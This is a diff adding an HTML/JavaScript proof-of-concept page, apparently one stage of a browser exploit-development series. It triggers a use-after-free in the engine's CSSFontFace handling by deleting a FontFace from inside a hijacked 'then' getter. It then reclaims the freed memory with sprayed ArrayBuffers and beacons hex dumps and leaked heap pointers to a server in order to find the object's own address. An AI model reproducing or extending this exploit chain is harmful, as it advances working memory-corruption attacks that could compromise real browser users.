@@ -1,0 +1,173 @@
+<!--
+  p566: Full hex dump of CSSFontFace UAF reclaim + all-buffer scan
+
+  Corrections from ng643 review of p565 (PR #166):
+  - Single stage only (stage 2 never reclaims, wastes memory)
+  - Full 192-byte hex dump of reclaimed buffer
+  - Scan ALL 16 spray buffers for any engine writes
+  - mod192/mod4k/mod16k/mod32k computed on full 64-bit address
+  - Removed broken stride formula
+  - Near-self pointer detection (qwords within 0x10000 of p58)
+
+  Goal: find self-referencing pointers in the engine object
+  to derive the buffer's own address (self_address).
+
+  CRASH_CLASS: LOW — same trigger as p563/p564/p565
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p566 bmalloc fullmap</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+var K = 16, SIZE = 192, styleEl = null, firedHere = false, scanDone = false;
+
+function hexN(v, off, n) {
+  var s = '';
+  for (var i = 0; i < n; i++) s += ('0' + v[off + i].toString(16)).slice(-2);
+  return s;
+}
+
+function hex8be(v, off) {
+  var s = '';
+  for (var i = 7; i >= 0; i--) s += ('0' + v[off + i].toString(16)).slice(-2);
+  return s;
+}
+
+function addr64(v, off) {
+  var lo = (v[off] | (v[off+1] << 8) | (v[off+2] << 16) | ((v[off+3] << 24) >>> 0)) >>> 0;
+  var hi = (v[off+4] | (v[off+5] << 8) | (v[off+6] << 16) | ((v[off+7] << 24) >>> 0)) >>> 0;
+  return hi * 0x100000000 + lo;
+}
+
+function setupFace(name, css) {
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive.push(A);
+}
+
+function installGetter() {
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl = null;
+      document.body.offsetHeight;
+
+      window.__bufs = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        v[0x10] = 0xBB;
+        v[0x11] = 0xAA;
+        v[0x12] = k & 0xFF;
+        window.__bufs.push(v);
+      }
+      try { document.fonts.check('1em s0'); } catch(e) {}
+      return undefined;
+    },
+    set: function() {}
+  });
+}
+
+function doScan() {
+  if (scanDone) return;
+  var bufs = window.__bufs || [];
+  if (bufs.length === 0) return;
+
+  var hits = [];
+  var touched = [];
+
+  for (var i = 0; i < bufs.length; i++) {
+    var v = bufs[i];
+    if (v[0x58] !== 0 || v[0x59] !== 0 || v[0x5A] !== 0 || v[0x5B] !== 0) {
+      hits.push(i);
+    }
+    if (v[0x10] !== 0xBB || v[0x11] !== 0xAA || v[0x12] !== (i & 0xFF)) {
+      if (hits.indexOf(i) < 0) touched.push(i);
+    }
+  }
+
+  if (hits.length === 0) return;
+  scanDone = true;
+
+  b('P566-MAP-hits_' + hits.join(',') + '-touched_' + (touched.length > 0 ? touched.join(',') : 'none'));
+
+  for (var h = 0; h < hits.length; h++) {
+    var idx = hits[h];
+    var v = bufs[idx];
+    var p58 = addr64(v, 0x58);
+    var p68 = addr64(v, 0x68);
+
+    b('P566-HIT-b' + idx
+      + '-p58_' + hex8be(v, 0x58)
+      + '-p68_' + hex8be(v, 0x68)
+      + '-m192_' + (p58 % 192)
+      + '-m4k_' + (p58 % 4096).toString(16)
+      + '-m16k_' + (p58 % 16384).toString(16)
+      + '-m32k_' + (p58 % 32768).toString(16));
+
+    b('P566-DUMP-b' + idx + '-A-' + hexN(v, 0, 64));
+    b('P566-DUMP-b' + idx + '-B-' + hexN(v, 64, 64));
+    b('P566-DUMP-b' + idx + '-C-' + hexN(v, 128, 64));
+
+    var ptrs = [];
+    var near = [];
+    for (var off = 0; off < SIZE; off += 8) {
+      var val = addr64(v, off);
+      if (val !== 0) {
+        ptrs.push('+' + off.toString(16) + '_' + hex8be(v, off));
+        var diff = val > p58 ? val - p58 : p58 - val;
+        if (diff <= 0x10000 && diff > 0) {
+          near.push('+' + off.toString(16) + '_' + hex8be(v, off) + '_d' + (val > p58 ? '+' : '-') + diff.toString(16));
+        }
+      }
+    }
+
+    var ptrStr = ptrs.join(',');
+    if (ptrStr.length <= 1400) {
+      b('P566-PTRS-' + ptrStr);
+    } else {
+      var mid = Math.floor(ptrs.length / 2);
+      b('P566-PTRS1-' + ptrs.slice(0, mid).join(','));
+      b('P566-PTRS2-' + ptrs.slice(mid).join(','));
+    }
+
+    if (near.length > 0) {
+      b('P566-NEAR-' + near.join(','));
+    } else {
+      b('P566-NEAR-none');
+    }
+  }
+
+  for (var t = 0; t < touched.length; t++) {
+    var ti = touched[t];
+    b('P566-TOUCH-b' + ti + '-' + hexN(bufs[ti], 0, 32) + '-at58_' + hexN(bufs[ti], 0x58, 8));
+  }
+
+  b('P566-DONE');
+}
+
+function start() {
+  window.__alive = [];
+  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter();
+  b('P566-SETUP');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function() { b('P566-RESOLVED'); },
+    function() { b('P566-REJECTED'); }
+  );
+  setTimeout(doScan, 80);
+  setTimeout(doScan, 250);
+  setTimeout(doScan, 500);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(start, 0);
+else document.addEventListener('DOMContentLoaded', start);
+</script></head><body><p>p566 bmalloc fullmap</p></body></html>
